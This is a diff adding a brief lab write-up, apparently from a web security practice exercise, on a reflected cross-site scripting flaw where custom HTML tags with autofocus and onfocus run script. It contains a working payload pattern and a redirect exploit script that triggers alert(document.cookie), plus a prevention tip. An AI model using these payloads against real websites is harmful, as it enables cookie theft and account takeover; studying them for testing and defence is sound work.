@@ -1,0 +1,20 @@
+Vulnerability:
+	The server allows the use of custom HTML tags.
+	Allowing an attacker to inject elements with event listeners to trigger JS execution.
+
+Exploit:
+	Example:
+		<xss onfocus=[PAYLOAD] autofocus tabindex=1>	
+	
+	Exploit Script:
+		<script>
+			window.location ="https://server.net/?search=%3Cmishmash%20onfocus%3Dalert(document.cookie)%20autofocus%20tabindex%3D1%3E"
+		</script>
+	
+Explanation:
+	- The victim enters the exploit server.
+	- The browser sends a request to the blog page with the malicious payload.
+	- The browser runs the payload.
+	
+Prevention:
+	- Block "<" ">" or Encode every special char before viewing the input on the page.
